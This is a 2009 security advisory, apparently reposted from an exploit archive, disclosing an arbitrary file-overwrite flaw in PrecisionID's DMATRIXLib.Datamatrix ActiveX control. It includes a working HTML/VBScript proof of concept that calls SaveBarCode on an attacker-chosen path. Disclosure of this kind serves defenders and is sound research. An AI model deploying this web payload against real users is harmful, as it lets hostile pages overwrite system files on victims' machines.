@@ -1,0 +1,88 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-09-030
+!!!             original advisory            !!!
+http://dsecrg.com/pages/vul/DSECRG-09-030.html
+
+
+Application:                    PrecisionID activeX controls 
+Versions Affected:              
+Vendor URL:                     http://PrecisionID.com
+Bugs:                           Arbitrary File overwriting
+Exploits:                       YES
+Reported:                       03.03.2009
+Vendor response:                NONE
+Secondly Reported:              17.03.2009
+Vendor response:                NONE 
+Date of Public Advisory:        31.0300.2009
+Authors:                        
+                                Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+PrecisionID  have activeX control DMATRIXLib.Datamatrix that can be used to overwrite any any file in target system.
+
+
+
+Details
+*******
+
+
+This control contains two methods SaveBarCode() SaveEnhWMF() that can be used to owervrite 
+any file on OS
+
+
+Sub SaveBarCode (
+        ByVal path  As String 
+)
+
+
+Sub SaveEnhWMF (
+        ByVal path  As String 
+)
+
+
+
+
+
+
+*******
+Example:
+
+
+
+<html>
+<object classid='clsid:6C951D10-B07F-11DB-A6ED-0050C2490048' id='target' />
+<script language='vbscript'>
+targetFile = "C:\WINDOWS\system32\PRECIS~2.DLL"
+prototype  = "Sub SaveBarCode ( ByVal path As String )"
+memberName = "SaveBarCode"
+progid     = "DMATRIXLib.Datamatrix"
+argCount   = 1
+
+arg1="C:\sh2kerr.pwn"
+
+target.SaveBarCode arg1 
+
+</script>
+</html>
+
+
+
+Solution
+********
+http://msdn.microsoft.com/en-us/library/aa751977.aspx
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:    research [at] dsecrg [dot]  com
+            http://www.dsecrg.com
+            http://www.dsec.ru
+
+# milw0rm.com [2009-03-31]
